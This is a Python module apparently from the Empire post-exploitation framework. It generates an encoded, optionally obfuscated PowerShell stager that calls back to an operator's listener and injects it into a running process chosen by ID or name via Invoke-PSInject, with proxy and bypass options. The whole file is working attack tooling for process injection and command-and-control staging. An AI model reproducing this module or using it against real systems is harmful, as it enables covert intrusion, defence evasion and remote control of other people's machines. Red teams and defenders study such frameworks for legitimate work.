from __future__ import print_function

import pathlib
from builtins import object
from builtins import str
from typing import Dict

from empire.server.common import helpers
from empire.server.common.module_models import PydanticModule
from empire.server.utils import data_util
from empire.server.utils.module_util import handle_error_message


class Module(object):
    @staticmethod
    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = ""):

        # staging options
        listener_name = params['Listener']
        proc_id = params['ProcId'].strip()
        proc_name = params['ProcName'].strip()
        user_agent = params['UserAgent']
        proxy = params['Proxy']
        proxy_creds = params['ProxyCreds']
        if (params['Obfuscate']).lower() == 'true':
            launcher_obfuscate = True
        else:
            launcher_obfuscate = False
        launcher_obfuscate_command = params['ObfuscateCommand']

        if proc_id == '' and proc_name == '':
            return handle_error_message("[!] Either ProcID or ProcName must be specified.")

        # read in the common module source code
        script, err = main_menu.modules.get_module_source(module_name=module.script_path, obfuscate=obfuscate, obfuscate_command=obfuscation_command)
        
        if err:
            return handle_error_message(err)

        script_end = ""
        if not main_menu.listeners.is_listener_valid(listener_name):
            # not a valid listener, return nothing for the script
            return handle_error_message("[!] Invalid listener: %s" %(listener_name))
        else:
            # generate the PowerShell one-liner with all of the proper options set
            launcher = main_menu.stagers.generate_launcher(listenerName=listener_name,
                                                           language='powershell',
                                                           obfuscate=launcher_obfuscate,
                                                           obfuscationCommand=launcher_obfuscate_command,
                                                           encode=True,
                                                           userAgent=user_agent,
                                                           proxy=proxy,
                                                           proxyCreds=proxy_creds,
                                                           bypasses=params['Bypasses'])
            if launcher == '':
                return handle_error_message('[!] Error in launcher generation.')
            elif len(launcher) > 5952:
                return handle_error_message("[!] Launcher string is too long!")
            else:
                launcher_code = launcher.split(' ')[-1]

                if proc_id != '':
                    script_end += "Invoke-PSInject -ProcID %s -PoshCode %s" % (proc_id, launcher_code)
                else:
                    script_end += "Invoke-PSInject -ProcName %s -PoshCode %s" % (proc_name, launcher_code)

        script = main_menu.modules.finalize_module(script=script, script_end=script_end, obfuscate=obfuscate, obfuscation_command=obfuscation_command)
        return script
